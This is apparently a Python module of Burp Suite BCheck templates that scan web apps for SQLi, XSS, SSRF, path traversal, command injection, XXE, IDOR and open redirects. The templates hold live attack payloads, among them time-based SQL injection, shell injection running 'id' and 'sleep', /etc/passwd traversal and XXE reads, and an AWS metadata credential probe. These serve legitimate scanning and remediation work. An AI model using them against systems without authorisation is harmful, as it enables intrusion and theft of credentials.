"""BCheck DSL v2-beta templates — correct syntax, one given...then per file."""

from __future__ import annotations

# Rules:
# - ONE given...then block per file, NO closing keyword (ends at EOF)
# - if...then closes with 'end if'
# - report issue: has NO closing keyword
# - send payload: uses colon + indented replacing:/appending:
# - response body: latest.response.body
# - response time: latest.response.duration

TEMPLATES: dict[str, str] = {

    "sqli": """\
metadata:
  language: v2-beta
  name: "{name}"
  description: "{description}"
  author: "{author}"
  tags: "sqli", "injection", "bcheck-mcp"

given insertion point then
  send payload:
    replacing: "'"
  if {to_lower(latest.response.body)} matches "sql syntax|mysql_fetch|ora-[0-9]+|postgresql|sqlite_error|unclosed quotation mark|quoted string not properly terminated" then
    report issue:
      severity: high
      confidence: tentative
      detail: "Possible SQL injection: database error triggered by single-quote payload. Manual verification required."
      remediation: "Use parameterised queries or prepared statements. Never concatenate user input into SQL strings."
  end if
  send payload:
    replacing: "' AND SLEEP(5)-- -"
  if latest.response.duration > 4500 then
    report issue:
      severity: high
      confidence: tentative
      detail: "Possible time-based blind SQL injection: response delayed after SLEEP(5) payload."
      remediation: "Use parameterised queries or prepared statements."
  end if
  send payload:
    replacing: "'; WAITFOR DELAY '0:0:5'-- -"
  if latest.response.duration > 4500 then
    report issue:
      severity: high
      confidence: tentative
      detail: "Possible time-based blind SQL injection (MSSQL): response delayed after WAITFOR DELAY payload."
      remediation: "Use parameterised queries or prepared statements."
  end if""",

    "xss": """\
metadata:
  language: v2-beta
  name: "{name}"
  description: "{description}"
  author: "{author}"
  tags: "xss", "injection", "bcheck-mcp"

given insertion point then
  send payload:
    replacing: "<bcheckxss>\\\">'><bcheckxss>"
  if {latest.response.body} matches "<bcheckxss>" then
    report issue:
      severity: high
      confidence: tentative
      detail: "Possible reflected XSS: injected marker was reflected in the response unescaped."
      remediation: "HTML-encode all user-supplied output. Apply a Content Security Policy."
  end if
  send payload:
    replacing: "javascript:bcheckxss(1)"
  if {latest.response.body} matches "javascript:bcheckxss" then
    report issue:
      severity: medium
      confidence: tentative
      detail: "Possible XSS via javascript: URI scheme reflected in response."
      remediation: "Validate and sanitize URL parameters. Block javascript: scheme in href/src attributes."
  end if""",

    "ssrf": """\
metadata:
  language: v2-beta
  name: "{name}"
  description: "{description}"
  author: "{author}"
  tags: "ssrf", "bcheck-mcp"

given insertion point then
  send payload:
    replacing: "http://169.254.169.254/latest/meta-data/"
  if {latest.response.body} matches "ami-id|instance-id|iam/security-credentials" then
    report issue:
      severity: critical
      confidence: firm
      detail: "SSRF confirmed: AWS IMDSv1 metadata retrieved via user-controlled URL parameter."
      remediation: "Validate and whitelist allowed URL destinations. Use IMDSv2 with token-based access."
  end if
  send payload:
    replacing: {collaborator_payload}
  if dns interaction then
    report issue:
      severity: high
      confidence: firm
      detail: "SSRF confirmed via Burp Collaborator: out-of-band DNS interaction triggered by user-controlled URL."
      remediation: "Validate and whitelist allowed URL destinations. Block requests to internal/cloud metadata addresses."
  end if""",

    "path_traversal": """\
metadata:
  language: v2-beta
  name: "{name}"
  description: "{description}"
  author: "{author}"
  tags: "path-traversal", "lfi", "bcheck-mcp"

given insertion point then
  send payload:
    replacing: "../../../../etc/passwd"
  if {latest.response.body} matches "root:x:0:0|root:\\*:" then
    report issue:
      severity: critical
      confidence: firm
      detail: "Path traversal confirmed: /etc/passwd content returned in response."
      remediation: "Canonicalize file paths and reject any path containing '..' sequences. Use an allow-list of permitted files."
  end if
  send payload:
    replacing: "..%2F..%2F..%2Fetc%2Fpasswd"
  if {latest.response.body} matches "root:x:0:0|root:\\*:" then
    report issue:
      severity: critical
      confidence: firm
      detail: "Path traversal confirmed (URL-encoded): /etc/passwd content returned."
      remediation: "URL-decode input before validating. Reject '..' sequences after decoding."
  end if
  send payload:
    replacing: "../../../../windows/win.ini"
  if {latest.response.body} matches "\\[extensions\\]|; for 16-bit" then
    report issue:
      severity: critical
      confidence: firm
      detail: "Path traversal confirmed: windows\\win.ini content returned."
      remediation: "Canonicalize file paths and reject any path containing '..' sequences."
  end if""",

    "cmdi": """\
metadata:
  language: v2-beta
  name: "{name}"
  description: "{description}"
  author: "{author}"
  tags: "cmdi", "command-injection", "rce", "bcheck-mcp"

given insertion point then
  send payload:
    replacing: "; echo bcheckrce_$(id)"
  if {latest.response.body} matches "bcheckrce_uid=" then
    report issue:
      severity: critical
      confidence: firm
      detail: "Command injection confirmed: output of id command reflected in response."
      remediation: "Never pass user input to shell functions. Use language-native APIs instead of shell commands."
  end if
  send payload:
    replacing: "; sleep 5"
  if latest.response.duration > 4500 then
    report issue:
      severity: high
      confidence: tentative
      detail: "Possible blind command injection: response delayed after sleep 5 payload."
      remediation: "Never pass user input to shell functions."
  end if
  send payload:
    replacing: "& ping -c 5 127.0.0.1 &"
  if latest.response.duration > 4000 then
    report issue:
      severity: high
      confidence: tentative
      detail: "Possible blind command injection: response delayed after ping-based payload."
      remediation: "Never pass user input to shell functions."
  end if""",

    "xxe": """\
metadata:
  language: v2-beta
  name: "{name}"
  description: "{description}"
  author: "{author}"
  tags: "xxe", "xml", "bcheck-mcp"

given body insertion point then
  send payload:
    replacing: "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><foo>&xxe;</foo>"
  if {latest.response.body} matches "root:x:0:0|root:\\*:" then
    report issue:
      severity: critical
      confidence: firm
      detail: "XXE confirmed: /etc/passwd content returned via external entity injection."
      remediation: "Disable external entity processing in your XML parser. Use a safe parser configuration."
  end if
  send payload:
    replacing: "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"http://{collaborator_payload}/xxe\\">]><foo>&xxe;</foo>"
  if dns interaction then
    report issue:
      severity: high
      confidence: firm
      detail: "Out-of-band XXE confirmed via Burp Collaborator DNS interaction."
      remediation: "Disable external entity processing in your XML parser."
  end if""",

    "idor": """\
metadata:
  language: v2-beta
  name: "{name}"
  description: "{description}"
  author: "{author}"
  tags: "idor", "bola", "access-control", "bcheck-mcp"

given query insertion point then
  send payload:
    replacing: "1"
  if {latest.response.body} matches ".+" then
    report issue:
      severity: medium
      confidence: tentative
      detail: "Possible IDOR: replacing ID value with '1' returned a non-empty response. Verify whether the returned object belongs to a different user."
      remediation: "Enforce object-level authorization checks on every resource access. Do not rely on ID obscurity."
  end if""",

    "open_redirect": """\
metadata:
  language: v2-beta
  name: "{name}"
  description: "{description}"
  author: "{author}"
  tags: "open-redirect", "bcheck-mcp"

given insertion point then
  send payload:
    replacing: "https://bcheck-mcp-canary.example.com/redirect"
  if {latest.response.body} matches "bcheck-mcp-canary\\.example\\.com" then
    report issue:
      severity: medium
      confidence: firm
      detail: "Open redirect confirmed: injected external URL appears in Location header or response body."
      remediation: "Whitelist allowed redirect destinations. Never redirect to user-supplied absolute URLs."
  end if
  send payload:
    replacing: "//bcheck-mcp-canary.example.com"
  if {latest.response.body} matches "bcheck-mcp-canary\\.example\\.com" then
    report issue:
      severity: medium
      confidence: firm
      detail: "Open redirect confirmed via protocol-relative URL in response."
      remediation: "Validate redirect URLs against a strict whitelist of allowed domains."
  end if""",
}

KEYWORD_MAP: dict[str, str] = {
    "sql": "sqli", "sqli": "sqli", "injection": "sqli",
    "xss": "xss", "cross-site": "xss", "script": "xss",
    "ssrf": "ssrf", "request forgery": "ssrf",
    "path traversal": "path_traversal", "traversal": "path_traversal",
    "lfi": "path_traversal", "directory traversal": "path_traversal",
    "command": "cmdi", "cmdi": "cmdi", "rce": "cmdi", "remote code": "cmdi",
    "xxe": "xxe", "xml": "xxe", "external entity": "xxe",
    "idor": "idor", "bola": "idor", "broken object": "idor",
    "redirect": "open_redirect", "open redirect": "open_redirect",
}

SUPPORTED_CLASSES = list(TEMPLATES.keys())
